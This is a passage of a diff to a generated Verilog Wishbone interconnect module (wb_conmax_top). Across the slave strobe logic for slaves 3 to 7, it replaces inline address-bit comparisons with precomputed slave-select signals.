-    always @ (  ( ( ( s3_pri_sel == 2'd0 ) ) ? ( s3_arb_state ) : ( ( ( ( s3_msel_pri_sel == 2'd0 ) ) ? ( s3_msel_arb0_state ) : ( ( ( ( s3_msel_pri_sel == 2'd1 ) ) ? ( s3_msel_sel1 ) : ( s3_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd3 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd3 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd3 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd3 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd3 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd3 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd3 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd3 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s3_pri_sel == 2'd0 ) ) ? ( s3_arb_state ) : ( ( ( ( s3_msel_pri_sel == 2'd0 ) ) ? ( s3_msel_arb0_state ) : ( ( ( ( s3_msel_pri_sel == 2'd1 ) ) ? ( s3_msel_sel1 ) : ( s3_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd3 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd3 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd3 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd3 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd3 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd3 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd3 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd3 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s3_pri_sel == 2'd0 ) ) ? ( s3_arb_state ) : ( ( ( ( s3_msel_pri_sel == 2'd0 ) ) ? ( s3_msel_arb0_state ) : ( ( ( ( s3_msel_pri_sel == 2'd1 ) ) ? ( s3_msel_sel1 ) : ( s3_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s3_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd3 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s3_wb_stb_o = ( ( ( m0_slv_sel == 4'd3 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s3_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd3 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s3_wb_stb_o = ( ( ( m1_slv_sel == 4'd3 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s3_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd3 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s3_wb_stb_o = ( ( ( m2_slv_sel == 4'd3 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s3_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd3 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s3_wb_stb_o = ( ( ( m3_slv_sel == 4'd3 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s3_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd3 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s3_wb_stb_o = ( ( ( m4_slv_sel == 4'd3 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s3_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd3 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s3_wb_stb_o = ( ( ( m5_slv_sel == 4'd3 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s3_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd3 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s3_wb_stb_o = ( ( ( m6_slv_sel == 4'd3 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s3_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd3 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s3_wb_stb_o = ( ( ( m7_slv_sel == 4'd3 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -21534,40 +21606,40 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  ( ( ( s4_pri_sel == 2'd0 ) ) ? ( s4_arb_state ) : ( ( ( ( s4_msel_pri_sel == 2'd0 ) ) ? ( s4_msel_arb0_state ) : ( ( ( ( s4_msel_pri_sel == 2'd1 ) ) ? ( s4_msel_sel1 ) : ( s4_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd4 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd4 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd4 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd4 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd4 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd4 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd4 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd4 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s4_pri_sel == 2'd0 ) ) ? ( s4_arb_state ) : ( ( ( ( s4_msel_pri_sel == 2'd0 ) ) ? ( s4_msel_arb0_state ) : ( ( ( ( s4_msel_pri_sel == 2'd1 ) ) ? ( s4_msel_sel1 ) : ( s4_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd4 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd4 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd4 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd4 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd4 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd4 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd4 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd4 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s4_pri_sel == 2'd0 ) ) ? ( s4_arb_state ) : ( ( ( ( s4_msel_pri_sel == 2'd0 ) ) ? ( s4_msel_arb0_state ) : ( ( ( ( s4_msel_pri_sel == 2'd1 ) ) ? ( s4_msel_sel1 ) : ( s4_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s4_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd4 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s4_wb_stb_o = ( ( ( m0_slv_sel == 4'd4 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s4_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd4 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s4_wb_stb_o = ( ( ( m1_slv_sel == 4'd4 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s4_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd4 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s4_wb_stb_o = ( ( ( m2_slv_sel == 4'd4 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s4_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd4 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s4_wb_stb_o = ( ( ( m3_slv_sel == 4'd4 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s4_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd4 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s4_wb_stb_o = ( ( ( m4_slv_sel == 4'd4 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s4_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd4 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s4_wb_stb_o = ( ( ( m5_slv_sel == 4'd4 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s4_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd4 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s4_wb_stb_o = ( ( ( m6_slv_sel == 4'd4 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s4_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd4 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s4_wb_stb_o = ( ( ( m7_slv_sel == 4'd4 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -24491,40 +24563,40 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  ( ( ( s5_pri_sel == 2'd0 ) ) ? ( s5_arb_state ) : ( ( ( ( s5_msel_pri_sel == 2'd0 ) ) ? ( s5_msel_arb0_state ) : ( ( ( ( s5_msel_pri_sel == 2'd1 ) ) ? ( s5_msel_sel1 ) : ( s5_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd5 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd5 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd5 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd5 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd5 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd5 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd5 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd5 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s5_pri_sel == 2'd0 ) ) ? ( s5_arb_state ) : ( ( ( ( s5_msel_pri_sel == 2'd0 ) ) ? ( s5_msel_arb0_state ) : ( ( ( ( s5_msel_pri_sel == 2'd1 ) ) ? ( s5_msel_sel1 ) : ( s5_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd5 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd5 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd5 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd5 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd5 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd5 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd5 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd5 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s5_pri_sel == 2'd0 ) ) ? ( s5_arb_state ) : ( ( ( ( s5_msel_pri_sel == 2'd0 ) ) ? ( s5_msel_arb0_state ) : ( ( ( ( s5_msel_pri_sel == 2'd1 ) ) ? ( s5_msel_sel1 ) : ( s5_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s5_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd5 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s5_wb_stb_o = ( ( ( m0_slv_sel == 4'd5 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s5_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd5 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s5_wb_stb_o = ( ( ( m1_slv_sel == 4'd5 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s5_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd5 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s5_wb_stb_o = ( ( ( m2_slv_sel == 4'd5 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s5_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd5 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s5_wb_stb_o = ( ( ( m3_slv_sel == 4'd5 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s5_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd5 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s5_wb_stb_o = ( ( ( m4_slv_sel == 4'd5 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s5_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd5 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s5_wb_stb_o = ( ( ( m5_slv_sel == 4'd5 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s5_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd5 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s5_wb_stb_o = ( ( ( m6_slv_sel == 4'd5 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s5_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd5 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s5_wb_stb_o = ( ( ( m7_slv_sel == 4'd5 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -27448,40 +27520,40 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  ( ( ( s6_pri_sel == 2'd0 ) ) ? ( s6_arb_state ) : ( ( ( ( s6_msel_pri_sel == 2'd0 ) ) ? ( s6_msel_arb0_state ) : ( ( ( ( s6_msel_pri_sel == 2'd1 ) ) ? ( s6_msel_sel1 ) : ( s6_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd6 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd6 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd6 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd6 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd6 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd6 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd6 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd6 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s6_pri_sel == 2'd0 ) ) ? ( s6_arb_state ) : ( ( ( ( s6_msel_pri_sel == 2'd0 ) ) ? ( s6_msel_arb0_state ) : ( ( ( ( s6_msel_pri_sel == 2'd1 ) ) ? ( s6_msel_sel1 ) : ( s6_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd6 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd6 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd6 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd6 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd6 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd6 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd6 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd6 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s6_pri_sel == 2'd0 ) ) ? ( s6_arb_state ) : ( ( ( ( s6_msel_pri_sel == 2'd0 ) ) ? ( s6_msel_arb0_state ) : ( ( ( ( s6_msel_pri_sel == 2'd1 ) ) ? ( s6_msel_sel1 ) : ( s6_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s6_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd6 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s6_wb_stb_o = ( ( ( m0_slv_sel == 4'd6 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s6_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd6 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s6_wb_stb_o = ( ( ( m1_slv_sel == 4'd6 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s6_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd6 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s6_wb_stb_o = ( ( ( m2_slv_sel == 4'd6 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s6_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd6 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s6_wb_stb_o = ( ( ( m3_slv_sel == 4'd6 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s6_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd6 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s6_wb_stb_o = ( ( ( m4_slv_sel == 4'd6 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s6_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd6 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s6_wb_stb_o = ( ( ( m5_slv_sel == 4'd6 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s6_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd6 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s6_wb_stb_o = ( ( ( m6_slv_sel == 4'd6 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s6_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd6 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s6_wb_stb_o = ( ( ( m7_slv_sel == 4'd6 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -30405,40 +30477,40 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  ( ( ( s7_pri_sel == 2'd0 ) ) ? ( s7_arb_state ) : ( ( ( ( s7_msel_pri_sel == 2'd0 ) ) ? ( s7_msel_arb0_state ) : ( ( ( ( s7_msel_pri_sel == 2'd1 ) ) ? ( s7_msel_sel1 ) : ( s7_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd7 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd7 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd7 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd7 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd7 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd7 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd7 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd7 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s7_pri_sel == 2'd0 ) ) ? ( s7_arb_state ) : ( ( ( ( s7_msel_pri_sel == 2'd0 ) ) ? ( s7_msel_arb0_state ) : ( ( ( ( s7_msel_pri_sel == 2'd1 ) ) ? ( s7_msel_sel1 ) : ( s7_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd7 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd7 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd7 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd7 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd7 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd7 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd7 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd7 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s7_pri_sel == 2'd0 ) ) ? ( s7_arb_state ) : ( ( ( ( s7_msel_pri_sel == 2'd0 ) ) ? ( s7_msel_arb0_state ) : ( ( ( ( s7_msel_pri_sel == 2'd1 ) ) ? ( s7_msel_sel1 ) : ( s7_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s7_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd7 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s7_wb_stb_o = ( ( ( m0_slv_sel == 4'd7 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s7_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd7 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s7_wb_stb_o = ( ( ( m1_slv_sel == 4'd7 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s7_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd7 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s7_wb_stb_o = ( ( ( m2_slv_sel == 4'd7 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s7_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd7 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s7_wb_stb_o = ( ( ( m3_slv_sel == 4'd7 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s7_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd7 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s7_wb_stb_o = ( ( ( m4_slv_sel == 4'd7 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s7_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd7 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s7_wb_stb_o = ( ( ( m5_slv_sel == 4'd7 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s7_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd7 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s7_wb_stb_o = ( ( ( m6_slv_sel == 4'd7 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s7_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd7 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s7_wb_stb_o = ( ( ( m7_slv_sel == 4'd7 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -33362,40 +33434,40 @@ module wb_conmax_top(
         end
         endcase
     end
